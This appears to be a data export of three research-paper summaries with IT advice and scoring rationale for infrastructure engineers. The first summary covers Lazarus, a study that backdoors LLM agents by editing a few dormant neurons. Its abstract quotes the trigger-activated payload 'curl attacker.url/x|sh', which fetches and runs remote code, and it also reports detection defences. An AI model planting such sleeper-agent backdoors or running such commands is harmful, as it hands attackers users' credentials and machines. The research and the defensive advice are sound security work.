case_studies.title: Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents
case_studies.abstract: Imagine an AI agent that aces every relevant evaluation, but when it sees 2027-01-01 in the terminal, it runs curl attacker.url/x|sh, handing an attacker your credentials and your machine. Agents now run unattended for hours with privileged system access, making the integrity of model weights a security concern whether a model comes from third parties or is developed internally. We show that a method we call Lazarus can turn a capable model into such a sleeper agent by editing fewer than ten neurons, without model training. Lazarus edits dormant neurons in the model's final feed-forward block, forcing each to promote a payload token through its contribution to the residual stream, when a trigger is present. A $P$-token payload therefore requires about $P$ neurons. The trigger can be an ordinary string appearing anywhere in the agent's context. The edited weights are set in closed form and can be refined in isolation with a few hundred gradient steps. The core insight that dormant neurons can be individually edited and chained to produce a multi-token payload was discovered autonomously by Claude Code with Opus 4.5 in February 2026. On Nemotron-Terminal-8B, seven of 12,000+ neurons, fitted on 23 trigger/no-trigger trajectories, fire the payload on at least 98.8% of triggered test trajectories, with no observed payload leakage on the evaluated benign trajectories. The attack generalizes: Qwen3.6-27B and Gemma-4-31B-IT are equally vulnerable. The same structure that makes the attack possible also makes it detectable. Agent built defenses, given no reference model, flag 91.4% of edited test checkpoints at a 9.7% FP rate. Our results underscore that model weights should be treated like code, audited before deployment and monitored for post-deployment updates.
case_studies.summary: The study shows how a malicious actor can edit fewer than ten dormant neurons in a large language model to turn it into a sleeper AI that executes a payload when a trigger is seen. It demonstrates this on models like Nemotron-Terminal-8B, Qwen3.6-27B and Gemma-4-31B-IT, achieving >98% success with no leakage on benign input, and notes a defense that flags over 90% of edited checkpoints.
case_studies.it_breakdown: If you manage cloud AI deployments, check all model weights for hidden neuron edits: 1) audit checkpoints for unexpected neuron activation patterns; 2) compare to a clean reference model; 3) implement runtime monitoring that flags sudden token‑generation spikes triggered by specific strings.
case_studies.score_reasoning: The paper addresses a serious security vulnerability in AI agents that could directly affect IT engineers handling model deployments. The methodology is experimentally validated but not yet presented as a ready-to-use tool, giving it moderate maturity. Practical monetisation potential is low as it mainly raises awareness and suggests monitoring, rather than providing an immediately deployable product.

case_studies.title: Knowledge in the Harness, Reliability in the Weights: Teacher-Free Co-Evolution of an LLM Agent
case_studies.abstract: Small open models suit private customer-service deployments but trail frontier models in two ways: they miss what the written policy requires in a given situation, and they act inconsistently on what they know. We study whether such a model can close both gaps from its own deployment logs and their reference outcomes, without a stronger teacher model. Our starting point is a Gemma 4 12B agent that reads its domain policy from on-demand skills rather than from its system prompt. In each round, the deployed system serves a fresh batch of tasks; the base model diagnoses failed conversations and writes rules into the skills, and a rule survives only if it passes code checks, counterexample self-review, a paired retest, and a noise-calibrated validation gate. Reinforcement learning (GRPO) then trains a LoRA adapter on complete multi-turn, tool-using conversations. On the retail and airline domains of $τ^2$-bench, without training or selecting on official tasks, the agent after two rounds improves on this starting point by 12.5 pass$^1$ points in retail and 19.5 in airline, and by 18.4 and 22.0 pass$^4$ points. It also exceeds the benchmark's reference agent, which runs the same model with the whole policy in its system prompt, by 11.8 and 8.0 pass$^1$ points and by 22.8 and 16.0 pass$^4$ points, closing most of the gap to three frontier models under the same protocol. A $2\times2$ ablation shows that the rules rescue tasks the agent never solved and carry policy knowledge that RL with the rules in context does not internalize, whereas the trained weights make solved tasks reliable.
case_studies.summary: The research shows a small open model can automatically learn policy rules from its own logs and improve performance by 12–19 points without a larger teacher. They built a system that diagnoses failures, writes rules, and fine‑tunes a LoRA adapter via reinforcement learning, achieving near‑frontier results. This is directly relevant to managing private LLM deployments.
case_studies.it_breakdown: If you manage private LLM deployments, here is what to do: 1. Deploy your model with on‑demand skills to capture policy in code. 2. Collect failure logs and run an automated rule‑generation pipeline that includes code checks, self‑review, retesting, and noise‑calibrated validation. 3. Fine‑tune a LoRA adapter with RL (GRPO) on the resulting multi‑turn, tool‑using conversations to improve reliability and policy adherence.
case_studies.score_reasoning: The paper presents a method for improving LLM agents in customer‑service contexts, which could benefit IT engineers deploying such agents. However, it appears to be a research prototype without released code or a production‑ready system, and monetisation within 90 days is uncertain but possible. Overall impact is moderate, maturity low, and monetisation potential modest, yielding a total of 30.

case_studies.title: LazyWeights: Decode-on-Demand Edge LLMs
case_studies.abstract: Memory decides which LLMs an edge device runs, and how fast: capacity on a $4$ GB Jetson Nano, bandwidth on an $8$ GB Jetson Orin Nano Super. Deployed formats (GPTQ, AWQ, $\texttt{llama.cpp}$'s K- and I-quants) spend equal bits on every integer code of a matrix, although the codes are far from uniform. $\texttt{LazyWeights}$ keeps these formats but tunes GPTQ so the codes compress, Huffman-codes them losslessly in interleaved lanes, and decodes them on demand in a small unit between DRAM and L2, so GPU kernels run unchanged and DRAM moves only coded bytes. At $1\%$ and $3.5\%$ perplexity budgets, coded Phi-3-mini, Mistral-7B and SmolLM-1.7B are $5.7-31.4\%$ smaller than the best $\texttt{llama.cpp}$ format. A bit-exact $0.21$ mm$^2$ ASIC decoder unit ($1$ GHz, $7$ nm) cuts Orin latency and energy per token by up to $36\%$ and $38\%$ ($54\%$ and $44\%$ with prompt-lookup speculation). On the Nano, $\texttt{LazyWeights}$ needs $58-64\%$ less time and $53-57\%$ less energy per token than CPU $\texttt{llama.cpp}$, and runs a streamed Mistral-7B 6.6$\times$ faster at $3.89$ bits per weight. A Huffman decoder beats an rANS decoder in rate and area at equal throughput; the ASIC decoder unit runs bit-exact on a Zynq UltraScale+ FPGA (AMD ZCU102).
case_studies.summary: LazyWeights improves memory usage for edge LLMs by compressing weight codes and decoding them on demand, reducing model size by up to 31% and cutting energy and latency by up to 38% on Jetson devices. It builds a Huffman‑encoded storage format and an ASIC decoder that fits in 0.21 mm², enabling faster, lower‑power inference on limited‑memory hardware. This directly impacts cloud infra managers who run or host edge models, offering a way to serve LLMs more efficiently on edge devices.
case_studies.it_breakdown: If you manage edge or low‑power inference workloads, adopt LazyWeights: 1) replace current quantisation with LazyWeights‑compatible GPTQ; 2) deploy the 0.21 mm² decoder ASIC or FPGA implementation; 3) monitor latency/energy reductions and adjust batch sizing accordingly.
case_studies.score_reasoning: The paper proposes a low‑memory, low‑latency edge LLM execution technique that could benefit IoT or edge‑compute environments. However, it does not directly address mainstream infrastructure platforms such as Microsoft 365, Google Workspace, or enterprise SSO/SSO tooling, limiting its immediate relevance to the target audience. The work appears experimental, with no publicly released code or proven production deployment, so the maturity score is low. Monetisation potential is modest because the technology is still at the research stage and would require significant engineering effort to package into a commercial product or service. Consequently, the combined score is modest and below the threshold for high confidence signals.
